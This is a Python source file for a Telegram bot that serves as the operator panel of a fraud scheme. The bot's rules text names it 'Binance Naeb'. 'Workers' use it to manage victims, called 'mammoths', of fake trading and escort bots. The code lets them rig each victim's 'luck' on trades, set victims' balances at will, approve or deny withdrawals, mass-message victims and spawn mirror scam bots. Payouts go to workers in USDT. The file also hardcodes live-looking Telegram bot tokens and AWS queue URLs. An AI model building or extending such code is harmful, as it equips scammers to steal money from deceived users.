import asyncio
import logging
from datetime import timedelta, datetime
import json
from  aws import sns, aws_region, aws_access_key_id, aws_secret_access_key
import aiobotocore as aiobotocore
from aiobotocore.config import AioConfig
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.dispatcher import FSMContext
from aiogram.types import ParseMode, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, InputFile
from aiogram.dispatcher.filters.state import State, StatesGroup
from db import Worker, session, Mammoth, Withdraws, Payouts
from img import generate_profile_stats_for_worker
from test import create_mirror
from escortbot import create_mirror_of_escort_bot
from aiobotocore.session import get_session
import requests
from  diction import active_chats
from config_for_bots import payout_for_admins_bot_token
from payoutbot import create_mirror_of_payout_bot
admin_chat_id  = '881704893'
#API_TOKEN = '6686215620:AAHPv-qUVFsAKH4ShiaGNfZWd0fHVYCX2qg'
API_TOKEN = '6425684889:AAHTvfvQ2v1UbhBn72LbQiT3lXzWcW3aPk0'
from aws import  sqs
logging.basicConfig(level=logging.INFO)
import threading

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())


support_team = ['881704893']


def withdraw_actions(withdraw_id):
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton('Принять', callback_data=f'accept_withdraw_{withdraw_id}')).add(InlineKeyboardButton('Отколнить',
                                                                                                                      callback_data=f'deny_withdraw_{withdraw_id}'))
    return keyboard


def mammont_management_buttons(mammonth_id):
    kb = InlineKeyboardMarkup()
    mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == mammonth_id).first()
    kb.add(InlineKeyboardButton(f'Удача {mammonth.luck}%', callback_data=json.dumps({'change_luck':mammonth_id})))
    kb.add(InlineKeyboardButton('Баланс', callback_data=json.dumps({'change_balance':mammonth_id})))
    kb.add((InlineKeyboardButton('Статистика', callback_data=json.dumps({'show_stats':mammonth_id}))))
    return  kb
all_mammonts = session.query(Mammoth).all()

class DistributeStates(StatesGroup):
    first = State()

@dp.message_handler(commands=['stop_chat'])
async def stop_chat(message:types.Message):
    mammonth_id = active_chats[message.from_user.id]
    mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == mammonth_id).first()
    token = session.query(Worker).filter(Worker.telegram_id == mammonth.belongs_to_worker).first().token
    data = {'chat_id': mammonth_id, 'text': 'Оператор разорвал соединение с вами'}
    await message.answer(active_chats)
    del active_chats[message.from_user.id]
    print(active_chats)
    requests.post(url=f'https://api.telegram.org/bot{token}/sendMessage', data=data)
    await message.answer('Вы разорвали соединение с юзером')

@dp.message_handler(lambda message: message.chat.id in active_chats)
async def forward_message(message: types.Message):


    mammonth_id = active_chats[message.chat.id]
    mamonth = session.query(Mammoth).filter(Mammoth.telegram_id == mammonth_id).first()
    worker = session.query(Worker).filter(Worker.telegram_id == mamonth.belongs_to_worker).first()
    data = {'chat_id': mamonth.telegram_id, 'text': message.text}
    requests.post(url=f'https://api.telegram.org/bot{worker.token}/sendMessage', data=data)

    await message.answer('Сообщение отослано')
@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('open_support_case_with_mammonth'))
async def handle_support_case_with_mammonth(query: types.CallbackQuery):
    mammonth_id = (query.data.split('_')[-1])
    for operator, mammonth in active_chats.items():
        if int(active_chats.get(operator)) == int(mammonth_id):
            await query.message.answer('Другой оператор уже общается с маммонтом!')
            return 0

    mamonth = session.query(Mammoth).filter(Mammoth.telegram_id == mammonth_id).first()
    worker = session.query(Worker).filter(Worker.telegram_id == mamonth.belongs_to_worker).first()
    mamonth.was_using_support = True
    session.commit()
    inline_keyboard = {
        "inline_keyboard": [
            [
                {"text": "Начать чат", "callback_data": f"start_chat_with_operator_{query.from_user.id}"},

            ]
        ]

    }
    data = {'chat_id': mamonth.telegram_id,
            'text': f'Оператор найден! нажмите кнопку *Начать чат*.Отправляйте только текстовые сообщения.Чтобы закончить чат - введите команду /stop_chat',
            "reply_markup":  inline_keyboard}
    response = requests.post(url=f'https://api.telegram.org/bot{worker.token}/sendMessage', json=data)

    active_chats[query.from_user.id] = query.data.split('_')[-1]
    await query.message.answer(f'Вы начали чат с пользователем {mammonth_id}. Чтобы закончить - введите комманду /stop_chat')

@dp.callback_query_handler(lambda callback_query: callback_query.data=='distribute')
async def handle_mammonths_distribute(query:types.CallbackQuery):
    await DistributeStates.first.set()
    
    await query.message.answer('Введите сообщение для рассілки')

@dp.message_handler(state=DistributeStates.first)
async def handle_distribution(message: types.Message, state: FSMContext):
    workers_mammonts = session.query(Mammoth).filter(Mammoth.belongs_to_worker == message.from_user.id).all()
    worker = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first()
    for mammonth in workers_mammonts:
        data = {'chat_id':mammonth.telegram_id, 'text':message.text}
        requests.post(url = f'https://api.telegram.org/bot{worker.token}/sendMessage', data = data)
    await state.finish()

@dp.message_handler(lambda message:message.text.startswith('/t'))
async def get_info_about_mammonth(message: types.Message):
    mammonth_service_id = message.text.split('t')[1]
    mammonth = session.query(Mammoth).filter(Mammoth.service_id == mammonth_service_id).first()
    worker = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first()
    try:
        if mammonth.belongs_to_worker == worker.telegram_id:

            template = f'''
💙 Мамонт с ID *{mammonth.service_id}* 

Telegram ID: `{mammonth.telegram_id}`
ID мамонта: *t{mammonth.service_id}*
Имя: {mammonth.first_name}

Баланс: {round(mammonth.balance,2)}₽
На выводе: {mammonth.on_output} ₽
Валюта: RUB
    '''
            await message.answer(template, parse_mode=ParseMode.MARKDOWN, reply_markup=mammont_management_buttons(mammonth.telegram_id))
    except AttributeError:
        await message.answer('Мамонт не найден!')

@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"show_stats":'))
async def handle_mammonth_show_stats(query:types.CallbackQuery):
    mammonth_telegram_id = json.loads(query.data)['show_stats']
    mamonth = session.query(Mammoth).filter(Mammoth.telegram_id == mammonth_telegram_id).first()
    template = f'''
🖤 Статистика мамонта *t{mamonth.service_id}* _{mamonth.first_name}_

Удачных сделок: *{mamonth.succesful_deals}*
Неудачных сделок: *{mamonth.deals - mamonth.succesful_deals}*
Общая прибыль: *{mamonth.profit}*₽ 
    
    
    '''
    await query.message.answer(template, parse_mode=ParseMode.MARKDOWN)

@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"change_luck":'))
async def handle_change_luck_mammonth(query:types.CallbackQuery):
    button = query.message.reply_markup.inline_keyboard[0][0]

    mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == json.loads(query.data)['change_luck']).first()
    if mammonth.luck == 100:
        mammonth.luck = 0
    else:
        mammonth.luck += 25
    session.commit()
    button.text = f'Удача {mammonth.luck}%'

    # Обновляем сообщение, чтобы применить изменения
    await query.message.edit_reply_markup(reply_markup=query.message.reply_markup)

class Change_mammonths_balance(StatesGroup):
    first = State()

@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"change_balance":'))
async def handle_change_balance_mammonth(query:types.CallbackQuery):
    state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
    data = dict()
    data['id'] = json.loads(query.data)['change_balance']
    await  state.set_data(data)
    await Change_mammonths_balance.first.set()
    await query.answer('Введите желаемую сумму баланса мамонта')

@dp.message_handler(state=Change_mammonths_balance.first)
async def change_balance(message: types.Message, state: FSMContext):
    data = await state.get_data()
    mammonth_telegram_id =data['id']
    mamonth = session.query(Mammoth).filter(Mammoth.telegram_id == mammonth_telegram_id ).first()
    try:
        mamonth.balance = float(message.text)
        session.commit()
        await message.answer("Баланс успешно изменен!")
    except Exception as ex:
        await message.answer('Введите корректное число')
    await  state.finish()

async def process_sqs_messages():
    session_aws = get_session()

    async with session_aws.create_client( service_name = 'sqs',
    aws_access_key_id=aws_access_key_id,
    aws_secret_access_key=aws_secret_access_key,
    region_name=aws_region) as sqs:
        while True:
            response = await sqs.receive_message(
                QueueUrl='https://sqs.eu-north-1.amazonaws.com/441199499768/NewApplications',
                AttributeNames=['All'],
                MaxNumberOfMessages=1,
                MessageAttributeNames=['All'],
                VisibilityTimeout=0,
                WaitTimeSeconds=0
            )
            response_for_deals = await sqs.receive_message(
                QueueUrl='https://sqs.eu-north-1.amazonaws.com/441199499768/NewApplicationsOnBid',
                AttributeNames=['All'],
                MaxNumberOfMessages=1,
                MessageAttributeNames=['All'],
                VisibilityTimeout=0,
                WaitTimeSeconds=0


            )
            response_for_withdraws = await sqs.receive_message(
                QueueUrl='https://sqs.eu-north-1.amazonaws.com/441199499768/ApplicationsToWithdraw1',
                AttributeNames=['All'],
                MaxNumberOfMessages=1,
                MessageAttributeNames=['All'],
                VisibilityTimeout=0,
                WaitTimeSeconds=0

            )
            try:
                diction_for_deals = response_for_deals['Messages'][0]['Body']
                msg_attributes = (json.loads(diction_for_deals).get('MessageAttributes'))
                MammonthTelegramId = json.loads(msg_attributes).get('MammonthTelegramId')
                Amount = json.loads(diction_for_deals).get('Amount')
                mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == MammonthTelegramId).first()
                if Amount < 0:
                    await  bot.send_message(mammonth.belongs_to_worker, f'{mammonth.name} совершил неприбыльную сделку и потерял {Amount} RUB')
                else:
                    await  bot.send_message(mammonth.belongs_to_worker, f'{mammonth.name} совершил прибыльную сделку и получил {Amount} RUB')
            except Exception as ex:
                print(ex)

            try:
                diction = response['Messages'][0]['Body']
                msg_attributes = (json.loads(diction).get('MessageAttributes'))
                print(msg_attributes)
                print(msg_attributes['MammonthId']['Value'])
                print(msg_attributes['Sum']['Value'])
                await bot.send_message(
                    int(msg_attributes['WorkerId']['Value']),
                    f'''💹 Новая заявка на пополнение! (Трейдинг)
                    

🐘 Мамонт: {msg_attributes['FirstName']['Value']} [/t{msg_attributes['MammonthId']['Value']}]!!
💳 Сумма: {msg_attributes['Sum']['Value']} RUB
                ''', reply_markup=create_top_up_mammonths_balance_button(mammonths_telegram_id=msg_attributes['MammonthId']['Value'], amount=msg_attributes['Sum']['Value'])
                )
                message = response['Messages'][0]
                receipt_handle = message['ReceiptHandle']
                await sqs.delete_message(QueueUrl='https://sqs.eu-north-1.amazonaws.com/441199499768/NewApplications', ReceiptHandle=receipt_handle)

            except Exception as ex:
                print(ex)
                print('!!!!!!')


            try:
                message = response_for_withdraws['Messages'][0]
                receipt_handle = message['ReceiptHandle']
                diction_for_withdraws = response_for_withdraws['Messages'][0]['Body']
                msg_attributes = (json.loads(diction_for_withdraws).get('MessageAttributes'))
                print(msg_attributes)
                withdraw_id = msg_attributes.get('withdraw_id')['Value']
                print(msg_attributes, withdraw_id)
                withdraw = session.query(Withdraws).filter(Withdraws.id == int(withdraw_id)).first()
                mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == withdraw.user_id).first()

                await bot.send_message(mammonth.belongs_to_worker, f'''Пользователь {mammonth.first_name} (/t{mammonth.service_id}) хочет вывести *{withdraw.amount}* 
                на счет `{withdraw.card}`''', parse_mode=ParseMode.MARKDOWN, reply_markup=withdraw_actions(int(withdraw_id)))
                await  sqs.delete_message(QueueUrl='https://sqs.eu-north-1.amazonaws.com/441199499768/ApplicationsToWithdraw1', ReceiptHandle=receipt_handle)
            except Exception as ex:
                print(ex, "пишка")
            await asyncio.sleep(10)


@dp.callback_query_handler(lambda callback_query:callback_query.data.startswith('accept_withdraw'))
async def handle_accept_withdraw(query: types.CallbackQuery):
    withdraw_id = query.data.split('_')[2]
    withdraw = session.query(Withdraws).filter(Withdraws.id == withdraw_id).first()
    mammont = session.query(Mammoth).filter(Mammoth.telegram_id == withdraw.user_id).first()
    worker = session.query(Worker).filter(Worker.telegram_id == mammont.belongs_to_worker).first()
    data = {'chat_id': mammont.telegram_id, 'text': f'''
    Ваша заявка была одобрена.
    Сумма вывода: {withdraw.amount} RUB 
        '''}
    requests.post(url=f'https://api.telegram.org/bot{worker.token}/sendMessage', data=data)

    await query.message.answer('Вы подтвердили заявку на вывод')

@dp.callback_query_handler(lambda callback_query:callback_query.data.startswith('deny_withdraw'))
async def handle_accept_withdraw(query: types.CallbackQuery):
    withdraw_id = query.data.split('_')[2]
    withdraw = session.query(Withdraws).filter(Withdraws.id == withdraw_id).first()
    mammont = session.query(Mammoth).filter(Mammoth.telegram_id == withdraw.user_id).first()
    worker = session.query(Worker).filter(Worker.telegram_id == mammont.belongs_to_worker).first()
    data = {'chat_id': mammont.telegram_id, 'text': f'''
Ваша заявка была отклонена.
Средства возвращены на баланс {withdraw.amount} RUB 
    '''}
    requests.post(url=f'https://api.telegram.org/bot{worker.token}/sendMessage', data=data)

    mammont.balance += withdraw.amount
    session.commit()
    await query.message.answer('Вы отклонили заявку на вывод')

class QuestionsAndAnswersStates(StatesGroup):
    first = State()
    second = State()
    third = State()


class create_mirror_bot_states(StatesGroup):
    first = State()
    second = State()

class create_mirror_for_escort_bot_states(StatesGroup):
    first = State()
    second = State()

def admin_approval_button(telegram_id):

    return InlineKeyboardMarkup().add(InlineKeyboardButton("Разрешить воркеру создать аккаунт", callback_data=json.dumps({"approvetocreateaccount":telegram_id})),
                                                           InlineKeyboardButton(
        'Запретить', callback_data=json.dumps({"disapprovetocreateaccount":telegram_id})))


def create_button_how_to_input_token():
    url = 'https://telegra.ph/Kak-sdelat-token-dlya-zerkala-04-07'
    return InlineKeyboardMarkup().add(InlineKeyboardButton("Как создать токен?", url=url))

def create_agree_button():
    return InlineKeyboardMarkup().add(InlineKeyboardButton('Согласен с правилами', callback_data='agreewithterms'))


def create_verification_button():
    return InlineKeyboardMarkup().add(InlineKeyboardButton('Проверить верификацию', callback_data='verifyThatUserIsNotUkrainian'))

def create_top_up_mammonths_balance_button(mammonths_telegram_id, amount):
    print(json.dumps({'mammonths_telegram_id' : mammonths_telegram_id, 'amount':amount}))
    return InlineKeyboardMarkup().add(InlineKeyboardButton('Пополнить', callback_data=json.dumps({'mammonths_telegram_id' : mammonths_telegram_id, 'amount':amount})))


def after_mamonts_management():
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton('Мои мамонты', callback_data='my_mammonts'))
    kb.add(InlineKeyboardButton('Массовая рассылка', callback_data='distribute'))
    kb.add(InlineKeyboardButton('Настройки', callback_data='mammonts_settings'))
    return kb


inline_kb_for_payouts = InlineKeyboardMarkup()
inline_kb_for_payouts.add(InlineKeyboardButton('Подтвердить вывод', callback_data='approve_payout'))

@dp.callback_query_handler(lambda callback_query: callback_query.data == 'approve_payout')
async def approve_payout_handler(query:types.CallbackQuery):
    await PayoutForWorkerStates.first.set()
    await query.message.answer('Введите сумму в RUB, которую вы хотите вывести ')



class PayoutForWorkerStates(StatesGroup):
    first = State()
    second = State()

@dp.message_handler(state=PayoutForWorkerStates.first)
async def payout_for_worker_states(message:types.Message, state:FSMContext):
    worker = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first()
    try:

        if float(message.text) <= worker.balance:
            state1 = dp.current_state(chat=message.chat.id, user=message.from_user.id)
            data = {}
            data['worker_id'] = int(message.from_user.id)
            data['amount'] = float(message.text)
            await state1.set_data(data)
            await  PayoutForWorkerStates.second.set()
            await message.answer('Введите адрес вашего кошелька USDT в сети TRON')

        else:
            await message.answer('На вашем балансе не хватает денег для исполнения операции, попробуйте еще раз')
            await state.finish()
    except Exception as ex:
        await message.answer('Неправильно введенный формат числа, попробуйте еще раз')
        await state.finish()


def keyboard_to_approve_payout(order_id):
    kb = InlineKeyboardMarkup()
    return kb.add(InlineKeyboardButton('Да!', callback_data=f'yes_{order_id}')).add(InlineKeyboardButton('Нет', callback_data=f'no_{order_id}'))
@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('yes_') or callback_query.data.startswith('no_'))
async def handle_approving_or_disapproving_of_payout(query:types.CallbackQuery):
    order_id = query.data.split('_')[1]
    payout  = session.query(Payouts).filter(Payouts.order_id == order_id).first()
    worker = session.query(Worker).filter(Worker.telegram_id == query.from_user.id).first()
    if query.data.startswith('yes_'):
        await query.message.answer('Ваша заявка была подана на рассмотрение. Ожидайте')
        inline_keyboard = {
            "inline_keyboard": [
                [
                    {"text": "Принять", "callback_data": f"approve_payout_{order_id}"},
                    {"text": "Отклонить", "callback_data": f"disapprove_payout_{order_id}"}
                ]
            ]

        }
        data_For_tg = {
            "chat_id": support_team[0],
            "text": f"""
Новая заявка на вывод
Воркер {worker.name} с айди {worker.telegram_id} хочет вывести {payout.amount} RUB на адрес {payout.address}""",
            "reply_markup": inline_keyboard,

        }
        await query.message.answer(f'''{requests.post(f'https://api.telegram.org/bot{payout_for_admins_bot_token}/sendMessage', json=data_For_tg).text}''')

    else:
        session.delete(payout)
        await query.message.answer('Ваша заявка была успешно удалена!')
    session.commit()
@dp.message_handler(state=PayoutForWorkerStates.second)
async def payout_for_worker_states_second_handler(message:types.Message,state:FSMContext):
    data = await state.get_data()
    response = requests.get('https://apilist.tronscan.io/api/account?address='+message.text)
    await state.finish()
    try:
        address = response.json()['activePermissions'][0]['keys'][0]['address']
        payout = Payouts(worker_id = message.from_user.id, amount = data['amount'], address = address)
        session.add(payout)
        session.commit()
        await message.answer(f'''
Адрес кошелька - `{address}`
Сумма вывода - *{data['amount']} RUB*
Все правильно?

''', reply_markup=keyboard_to_approve_payout(payout.order_id), parse_mode=ParseMode.MARKDOWN)
        await state.finish()
    except:
        await message.answer('Вы ввели несуществующий адрес')
        await state.finish()

@dp.callback_query_handler(lambda callback_query: callback_query.data == 'payout_for_worker')
async def payout_for_worker_handler(query:types.CallbackQuery):
    worker = session.query(Worker).filter(Worker.telegram_id == query.from_user.id).first()
    if session.query(Payouts).filter(Payouts.worker_id == query.from_user.id).first():
        await query.message.answer('Ваша заявка уже на рассмотрении. Нельзя создавать новые заявки на вывод, пока на рассмотрении есть другие')
        return
    if worker.balance >= 2000:
        await query.message.answer(f'''
Для вывода у вас доступно *{worker.balance}* RUB
Вывод доступен только на *криптовалютный кошелёк USDT в сети TRON*.
Нажмите кнопку _Подтвердить вывод_ чтоб создать заявку на вывод средств.
''', parse_mode=ParseMode.MARKDOWN, reply_markup= inline_kb_for_payouts)
    else:
        await query.message.answer(f'''
Вывод доступен только с 2000 RUB на вашем балансе
Ваш баланс сейчас - *{worker.balance}*
''', parse_mode=ParseMode.MARKDOWN)
markup_for_payout = InlineKeyboardMarkup()
markup_for_payout.add(InlineKeyboardButton('Вывести средства', callback_data='payout_for_worker'))

markup = ReplyKeyboardMarkup(resize_keyboard=True)

    # Создаем кнопки и добавляем их к клавиатуре
profile_button = KeyboardButton("Профиль 🐳")
nft_button = KeyboardButton("NFT 💠")
trading_button = KeyboardButton("Трейдинг 📊")
casino_button = KeyboardButton("Казино 🎰")
arbitrage_button = KeyboardButton("Арбитраж 🌐")
about_button = KeyboardButton("О проекте 👨‍💻")
escort_button = KeyboardButton("Эскорт💝")
    # Добавляем кнопки к клавиатуре (можно добавить больше кнопок)
markup.add(profile_button, nft_button, trading_button, escort_button)
markup.add(casino_button, arbitrage_button, about_button)


def create_markup_for_escort():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('Управление мамонтам', callback_data='mammonths_management_for_escort_bot'))
    markup.add(InlineKeyboardButton('Создать зеркало бота', callback_data='create_mirror_for_escort_bot'))
    markup.add(InlineKeyboardButton('Создать модель', callback_data='create_model_for_escort_bot'))
    return markup

def create_markup_for_trading():
    markup_for_trading = InlineKeyboardMarkup()
    markup_for_trading.add(InlineKeyboardButton('Управление мамонтам', callback_data='mammonths_management'))
    markup_for_trading.add(InlineKeyboardButton('Создать зеркало бота', callback_data='create_mirror'))
    markup_for_trading.add(InlineKeyboardButton('Минималка', callback_data='minimal_amount'))
    return markup_for_trading
@dp.message_handler(lambda message: message.text in ["Профиль 🐳", "NFT 💠", "Трейдинг 📊", "Казино 🎰", "Арбитраж 🌐", "О проекте 👨‍💻", 'Эскорт💝'])
async def handle_menu(message: types.Message):
    user = session.query(Worker).filter(Worker.telegram_id==message.from_user.id).first()
    if not user:
        await message.answer('Авторизуйтесь чтобы получить доступ к функциям воркеров')
        return
    service_id = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first().service_id

    if message.text == "Профиль 🐳":
        await showprofile(message)
    elif message.text == "NFT 💠":
        await message.answer("Вы выбрали 'NFT 💠'")
    elif message.text == "Трейдинг 📊":

        template =f'''
📊 Трейдинг

📋 Ваш код: `{service_id}`
🔗 Ваша реферальная ссылка: [НАЖМИ И СКОПИРУЙ](https://t.me/HotBiitBot?start={service_id})
        
        
        
        '''
        await message.answer(template, reply_markup=create_markup_for_trading(), parse_mode=ParseMode.MARKDOWN)
    elif message.text == 'Эскорт💝':
        await message.answer(f'''
💝 Эскорт

📝 Инструкция по боту [здесь](https://telegra.ph/RGT--EHskort-09-23)
📋 Ваш код: [`{service_id}`]
        
    ''', parse_mode=ParseMode.MARKDOWN, reply_markup=create_markup_for_escort())
    elif message.text == "Казино 🎰":
        await message.answer("Вы выбрали 'Казино 🎰'")
    elif message.text == "Арбитраж 🌐":
        await message.answer("Вы выбрали 'Арбитраж 🌐'")
    elif message.text == "О проекте 👨‍💻":
        await message.answer("Вы выбрали 'О проекте 👨‍💻'")


async def showprofile(message: types.Message):
    worker = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first()
    await generate_profile_stats_for_worker(str(worker.telegram_id), str(worker.balance), str(worker.profit), str(worker.warnings), worker.payment_method )
    caption = f"""
🗃 Твой профиль [{worker.telegram_id}],  0 уровень!

Код для сервисов: {worker.service_id}

💸 У тебя {worker.profit_quantity} профитов на сумму {worker.profit} RUB
Средний профит {(lambda profit, profit_quantity: 0 if profit_quantity == 0 else profit / profit_quantity)(worker.profit, worker.profit_quantity)} RUB

Приглашено: {len(session.query(Mammoth).filter(Mammoth.belongs_to_worker == message.from_user.id).all())} маммонтов, {len(worker.invited_worker.split(','))-1} воркеров 
Баланс: {worker.balance} RUB
Статус: Воркер
Предупреждений: [{worker.warnings}/3]
Способ выплаты: {worker.payment_method}

В команде: {(datetime.utcnow() - worker.created_at).days+1} день/дня

🌕 Всё работает, воркаем!
    
    
    
    """

    await message.answer('⚡', reply_markup=markup)
    with open(f'{worker.telegram_id}.png', 'rb') as img:
        await bot.send_photo(chat_id=message.chat.id, photo=InputFile(img), caption=caption, reply_markup=markup_for_payout)

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):


    try:

        service_id = int(message.get_args())
        worker = session.query(Worker).filter(Worker.service_id == service_id).first()
        if message.from_user.id != worker.telegram_id:
            worker.invited_worker += f'{message.from_user.id},'
            session.commit()

            await bot.send_message(chat_id= worker.telegram_id,text = 'По вашей реферальной ссылке перешел новый воркер!')
    except Exception as ex:
        'ok'

    if not session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first():
    # Текст с правилами
        rules_text = """
💬 Правила Binance Naeb  💬 

Запрещено:

`🔸 Распространение запрещённых материалов, 18+ GIF/Стикеров/Видео/Фото`
`🔸 Попрошайничество`
`🔸 Реклама сторонних проектов или же услуг`
`🔸 Дезинформация о проекте`
`🔸 Принимать платежи на свои реквизиты`
`🔸 Спамить или тегать стафф, потому что вам не отвечают в лс`
`🔸 Оскорблять национальность/высказывать свои полит взгляды`
`🔸 Использовать любые ТП кроме ботов тимы`
`🔸 Оскорблять любого из представителей администрации`

Вы ознакомились и согласились с правилами проекта ✅
    """

        await  message.answer('⚡', reply_markup=markup)
        msg = await message.reply(rules_text, parse_mode=ParseMode.MARKDOWN, reply_markup=create_agree_button())
        loop = asyncio.get_event_loop()
        loop.run_until_complete(await process_sqs_messages())
    else:
        await showprofile(message)
        loop = asyncio.get_event_loop()
        loop.run_until_complete(await process_sqs_messages())

@dp.callback_query_handler(lambda callback_query: callback_query.data == 'agreewithterms')
async def handle_agree_callback(query: types.CallbackQuery):
    await query.message.delete()
    await query.message.answer("Здравствуйте! Пожалуйста, ответьте на следующие вопросы:\n"
                        "1. У вас есть опыт работы в такой сфере? (Да/Нет)")
    # Устанавливаем состояние ожидания ответа на первый вопрос
    await QuestionsAndAnswersStates.first.set()


@dp.callback_query_handler(lambda callback_query: callback_query.data == 'create_mirror_for_escort_bot')
async def create_mirror_for_escort_bot_handler(query: types.CallbackQuery):
    await create_mirror_for_escort_bot_states.first.set()
    await query.message.answer('Введите токен бота', reply_markup=create_button_how_to_input_token())

@dp.callback_query_handler(lambda callback_query: callback_query.data == 'create_mirror')
async def create_mirror_handler(query: types.CallbackQuery):



    await create_mirror_bot_states.first.set()
    await query.message.answer('Введите токен бота', reply_markup=create_button_how_to_input_token())


@dp.callback_query_handler(lambda callback_query: callback_query.data == 'my_mammonts' )
async def my_mammonts_handler(query: types.CallbackQuery):
    worker = session.query(Worker).filter(Worker.telegram_id ==  query.from_user.id  ).first()
    template = 'Ваши маммонты'
    from aiogram.types import  User
    mammonts = worker.mammonts.split(',')[:-1]
    for mammont in mammonts:
        mammont_from_db = session.query(Mammoth).filter(Mammoth.telegram_id == mammont).first()

        template += f'''
У тебя {len(mammonts)} мамонт/мамонта
(/t{mammont_from_db.service_id}) - {mammont_from_db.first_name} - *{mammont_from_db.balance}*, Фарт - {mammont_from_db.luck}
'''
    await query.message.answer(template, parse_mode=ParseMode.MARKDOWN)
@dp.message_handler(state=create_mirror_for_escort_bot_states.first)
async def create_mirror_for_escort_bot_states_first_handler(message: types.Message, state: FSMContext):
    worker = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first()

    async with state.proxy() as data:
        data['mirror_bot_token'] = message.text
    await state.finish()
    import threading
    mirror_bot_thread = threading.Thread(target=create_mirror_of_escort_bot, args=(message.text, message.from_user.id))
    mirror_bot_thread.start()
    try:
        if Bot(message.text):
            await message.reply(f"""Создание зеркала завершено!""", parse_mode=ParseMode.MARKDOWN)
            worker.token = message.text
            session.commit()


    except:
        await message.reply(f"""Вы ввели несуществующий токен!""", parse_mode=ParseMode.MARKDOWN)
@dp.message_handler(state=create_mirror_bot_states.first)
async def create_mirror_states_first_handler(message: types.Message, state: FSMContext):
    worker = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first()

    async with state.proxy() as data:
        data['mirror_bot_token'] = message.text
    await state.finish()
    import threading
    mirror_bot_thread =  threading.Thread(target=create_mirror, args=(message.text, message.from_user.id))
    mirror_bot_thread.start()
    try:
        if Bot(message.text):
            await message.reply(f"""Создание зеркала завершено!""", parse_mode=ParseMode.MARKDOWN)
            worker.token = message.text
            session.commit()


    except:
        await message.reply(f"""Вы ввели несуществующий токен!""", parse_mode=ParseMode.MARKDOWN)
@dp.callback_query_handler(lambda callback_query:callback_query.data=='mammonths_management')
async def mammonts_management_handler(query:types.CallbackQuery):
    worker_id = query.message.from_user.id

    await query.message.delete()
    await query.message.answer( '📊 Выберите *действие*', reply_markup=after_mamonts_management(), parse_mode=ParseMode.MARKDOWN)



@dp.message_handler(state=QuestionsAndAnswersStates.first)
async def answer1(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['id'] = message.from_user.id
        data['answer1'] = message.text.lower()
    # Задаем второй вопрос
    await message.reply("2. Откуда Вы узнали о нас?")
    # Устанавливаем состояние ожидания ответа на второй вопрос
    await QuestionsAndAnswersStates.second.set()

@dp.message_handler(state=QuestionsAndAnswersStates.second)
async def answer2(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['answer2'] = message.text
    # Задаем третий вопрос
    await message.reply("3. У вас есть опыт работы в такой сфере? (Да/Нет)")
    # Устанавливаем состояние ожидания ответа на третий вопрос
    await QuestionsAndAnswersStates.third.set()


@dp.message_handler(state=QuestionsAndAnswersStates.third)
async def answer3(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['answer3'] = message.text.lower()

    # Отправляем ответы администратору
    await bot.send_message(admin_chat_id, f"Ответы пользователя: `{data['id']}` \n"
                                         f"1. Опыт работы в сфере: {data['answer1']}\n"
                                         f"2. Источник информации: {data['answer2']}\n"
                                         f"3. Опыт работы в сфере: {data['answer3']}", parse_mode=ParseMode.MARKDOWN, reply_markup=admin_approval_button(
        message.from_user.id))
    # Завершаем состояние
    await state.finish()


@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"mammonths_telegram_id":'))
async def handle_top_up_mammonths_balance(query: types.CallbackQuery):
    data = json.loads(query.data)
    mammonths_telegram_id = int(data['mammonths_telegram_id'])
    amount = int(data['amount'])
    mammonth = session.query(Mammoth).filter(Mammoth.telegram_id==mammonths_telegram_id).first()
    mammonth.balance += amount
    session.commit()
    await query.message.answer('Вы оплатили заявку', parse_mode=ParseMode.MARKDOWN)

@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"approvetocreateaccount": '))
async def handle_approve_callback(query: types.CallbackQuery):

    chat_id = json.loads(query.data)['approvetocreateaccount']
    chat = await  bot.get_chat(chat_id)
    await bot.send_message(chat_id, "Вы верифицированный пользователь. Теперь вы имеете право пользоваться функциями для воркеров")

    new_user = Worker(telegram_id=chat_id, name=chat.username, token='6697933833:AAHN1XS3c8xYnk8MpePa8CyPYD03cxbCSbg')
    session.add(new_user)
    session.commit()


@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"disapprovetocreateaccount": '))
async def handle_approve_callback(query: types.CallbackQuery):
    chat_id = json.loads(query.data)['approvetocreateaccount']
    await bot.send_message(chat_id, "Вам запрещено пользоваться функциями для воркеров")






if __name__ == '__main__':

    from aiogram import executor
    import threading

    mirror_bot_threadw = threading.Thread(target=create_mirror_of_payout_bot, args=('6415616043:AAHLjQXT08DSEvk_OVIupYlNftSeo2FpACY',))
    mirror_bot_threadw.start()
    mirror_bot_thread = threading.Thread(target=create_mirror, args=('6697933833:AAHN1XS3c8xYnk8MpePa8CyPYD03cxbCSbg',))
    mirror_bot_thread.start()

    storage = MemoryStorage()
